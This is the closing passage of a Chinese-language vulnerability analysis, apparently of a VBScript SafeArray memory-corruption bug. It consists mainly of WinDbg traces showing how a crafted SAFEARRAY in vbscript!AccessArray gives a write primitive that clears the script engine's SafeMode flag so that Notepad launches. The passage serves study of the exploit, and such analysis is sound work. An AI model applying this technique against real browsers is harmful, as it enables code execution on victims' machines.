    breakpoint 0 redefined
    0:005> g
    Breakpoint 0 hit
    eax=0249cd58 ebx=004692e8 ecx=00000000 edx=00000078 esi=01df8510 edi=01e00900
    eip=7664ec2c esp=0249cd44 ebp=0249cd60 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    OLEAUT32!SafeArrayRedim:
    7664ec2c 8bff            mov     edi,edi
    0:005> be *
    0:005> g
    Breakpoint 2 hit
    eax=0249cd70 ebx=0249ceb4 ecx=0249ceb4 edx=0000400c esi=00000001 edi=01e00910
    eip=6fb11f4c esp=0249cd44 ebp=0249cd5c iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    vbscript!AccessArray:
    6fb11f4c 8bff            mov     edi,edi
    0:005> dd esp L8
    0249cd44  6fb12028 0249ce54 0013f274 00000001
    0249cd54  01df8510 0249cd70 0249ce5c 6fb0dc01
    0:005> gu
    eax=00000000 ebx=0249ceb4 ecx=0249ce54 edx=00000002 esi=00000001 edi=01e00910
    eip=6fb12028 esp=0249cd5c ebp=0249cd5c iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    vbscript!CScriptRuntime::LockArray+0x1a:
    6fb12028 85c0            test    eax,eax
    0:005> dd poi(0249ce54) L4
    02e67930  00000000 00000000 00000000 00000000
    0:005> dt ole32!tagSAFEARRAY poi(0249cd70)
       +0x000 cDims            : 1
       +0x002 fFeatures        : 0x880
       +0x004 cbElements       : 0x10
       +0x008 cLocks           : 0
       +0x00c pvData           : 0x02e678f0 Void
       +0x010 rgsabound        : [1] tagSAFEARRAYBOUND
    0:005> g
    Breakpoint 2 hit
    eax=0249cd70 ebx=0249ceb4 ecx=0249ceb4 edx=0000400c esi=00000001 edi=01e00900
    eip=6fb11f4c esp=0249cd44 ebp=0249cd5c iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    vbscript!AccessArray:
    6fb11f4c 8bff            mov     edi,edi
    0:005> dd esp L8
    0249cd44  6fb12028 0249ce54 0013f23c 00000001
    0249cd54  01df8500 0249cd70 0249ce5c 6fb0dc01
    0:005> gu
    eax=00000000 ebx=0249ceb4 ecx=0249ce54 edx=00000060 esi=00000001 edi=01e00900
    eip=6fb12028 esp=0249cd5c ebp=0249cd5c iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    vbscript!CScriptRuntime::LockArray+0x1a:
    6fb12028 85c0            test    eax,eax
    0:005> dd poi(0249ce54) L4
    02e67918  0000200c 0000200c 00405014 0249cc18
    0:005> dt ole32!tagSAFEARRAY poi(0249cd70)
       +0x000 cDims            : 1
       +0x002 fFeatures        : 0x880
       +0x004 cbElements       : 0x10
       +0x008 cLocks           : 0
       +0x00c pvData           : 0x02e66ec8 Void
       +0x010 rgsabound        : [1] tagSAFEARRAYBOUND
    0:005> g
    Breakpoint 2 hit
    eax=0249ce54 ebx=0249ceb4 ecx=01df8500 edx=0000400c esi=00000001 edi=00000010
    eip=6fb11f4c esp=0249cd5c ebp=0249ce5c iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    vbscript!AccessArray:
    6fb11f4c 8bff            mov     edi,edi
    0:005> dd esp L8
    0249cd5c  6fb0255c 0249ce54 01df8500 00000001
    0249cd6c  01df84f0 00000000 0249d070 0249ceb4
    0:005> dd 01df8500 L4
    01df8500  0000400c 00000000 02e67918 00000000
    0:005> dd 02e67918 L4
    02e67918  0000200c 0000200c 00405014 0249cc18
    0:005> dd 00405014 L6
    00405014  08800001 00000001 00000000 00000000
    00405024  7fff0000 00000000
    0:005> dt ole32!tagSAFEARRAY 00405014
       +0x000 cDims            : 1
       +0x002 fFeatures        : 0x880
       +0x004 cbElements       : 1
       +0x008 cLocks           : 0
       +0x00c pvData           : (null) 
       +0x010 rgsabound        : [1] tagSAFEARRAYBOUND
可以看到，之前精心构造的SAFEARRAY结构在这里用到了，通过它可返回以索引值i+&h11c+k为起始地址的Variant结构变量，即pvData+(i+&h11c+k)*cbElements=i+&h11c+k，因此可实现Write
primitive，这里该索引值为0x01df7760：
    ......
    0:005> p
    eax=01df7760 ebx=01df84f0 ecx=00000003 edx=00000003 esi=00405014 edi=00405024
    eip=6fb11fe8 esp=0249cd3c ebp=0249cd58 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    vbscript!AccessArray+0xd6:
    6fb11fe8 8b4604          mov     eax,dword ptr [esi+4] ds:0023:00405018=00000001
    0:005> 
    eax=00000001 ebx=01df84f0 ecx=00000003 edx=00000003 esi=00405014 edi=00405024
    eip=6fb11feb esp=0249cd3c ebp=0249cd58 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    vbscript!AccessArray+0xd9:
    6fb11feb 0faf450c        imul    eax,dword ptr [ebp+0Ch] ss:0023:0249cd64=01df7760
    0:005> 
    eax=01df7760 ebx=01df84f0 ecx=00000003 edx=00000003 esi=00405014 edi=00405024
    eip=6fb11fef esp=0249cd3c ebp=0249cd58 iopl=0         nv up ei pl nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
    vbscript!AccessArray+0xdd:
    6fb11fef 03460c          add     eax,dword ptr [esi+0Ch] ds:0023:00405020=00000000
    0:005> 
    eax=01df7760 ebx=01df84f0 ecx=00000003 edx=00000003 esi=00405014 edi=00405024
    eip=6fb11ff2 esp=0249cd3c ebp=0249cd58 iopl=0         nv up ei pl nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
    vbscript!AccessArray+0xe0:
    6fb11ff2 8b4d08          mov     ecx,dword ptr [ebp+8] ss:0023:0249cd60=0249ce54
    0:005> 
    eax=01df7760 ebx=01df84f0 ecx=0249ce54 edx=00000003 esi=00405014 edi=00405024
    eip=6fb11ff5 esp=0249cd3c ebp=0249cd58 iopl=0         nv up ei pl nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
    vbscript!AccessArray+0xe3:
    6fb11ff5 8901            mov     dword ptr [ecx],eax  ds:0023:0249ce54=01df8500
    ......
    0:005> dd poi(0249ce54) L4
    01df7760  00000000 0000000e 00000000 00000000
    0:005> db 02e678e8 L20
    02e678e8  ef 6a d2 68 6c 4b 02 08-02 00 00 00 00 00 00 00  .j.hlK..........
    02e678f8  00 00 00 00 00 00 00 00-68 77 df 01 01 00 a0 41  ........hw.....A
再接着就是将前面获取的ab(4)赋给这个Variant结构变量：
    0:005> g
    Breakpoint 1 hit
    eax=01df8510 ebx=0249ceb4 ecx=0249ceb4 edx=00000003 esi=00000001 edi=00000010
    eip=6fb02e64 esp=0249cd60 ebp=0249ce5c iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    vbscript!AssignVar:
    6fb02e64 8bff            mov     edi,edi
    0:005> g
    Breakpoint 0 hit
    eax=0249cd58 ebx=004692e8 ecx=00000000 edx=00000060 esi=01df8510 edi=01e00900
    eip=7664ec2c esp=0249cd44 ebp=0249cd60 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    OLEAUT32!SafeArrayRedim:
    7664ec2c 8bff            mov     edi,edi
    0:005> dd 01df7760 L4
    01df7760  00000000 00000000 00000000 00000000
可以看到SafeMode标志被清零了，因此记事本也就能弹出来了。
### 0x05 参考
  *   
  *  (web archive)  
  *   
  *   
  * 
* * *